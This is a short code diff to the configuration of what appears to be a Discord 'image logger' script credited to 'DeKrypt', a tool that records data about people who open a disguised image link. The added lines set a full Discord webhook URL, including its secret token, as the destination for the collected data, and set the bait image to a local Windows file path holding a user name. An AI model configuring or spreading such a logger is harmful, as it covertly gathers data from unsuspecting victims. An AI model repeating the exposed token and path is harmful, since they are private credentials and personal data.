@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1345281050649296946/9-Zah3OW6MY3nyK5q0T2lXfJsqDckWhJicpBKKiDhlSoJR5nDCpw1cGH72t-wwnq5_qV",
+    "image": "file:///C:/Users/bulent/Downloads/(11)%20Discord%20_%20Genel%20G%C3%B6r%C3%BCn%C3%BCm%20_%20Quarter%20Tier%20List%20(1.9+)_files/44d59628c4c11935ce174219f446186f.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
